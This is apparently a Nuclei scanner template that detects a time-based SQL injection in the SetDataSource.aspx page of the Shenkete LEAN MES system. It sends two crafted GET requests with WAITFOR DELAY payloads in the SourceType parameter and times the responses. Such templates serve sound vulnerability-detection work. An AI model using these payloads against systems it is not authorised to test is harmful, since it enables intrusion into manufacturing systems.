id: shenkete-LEAN-MES-SetDataSource-sql

info:
  name: 深科特 LEAN MES系统 SetDataSource.aspx 存在SQL注入漏洞
  author: shenkete
  severity: high
  tags: shenkete

http:
  - raw:
      - |+
        GET /SDP/SetDataSource.aspx?modelId=1&SourceType=%27WAITFOR+DELAY+%270%3A0%3A2%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36

      - |+
        GET /SDP/SetDataSource.aspx?modelId=1&SourceType=%27WAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and
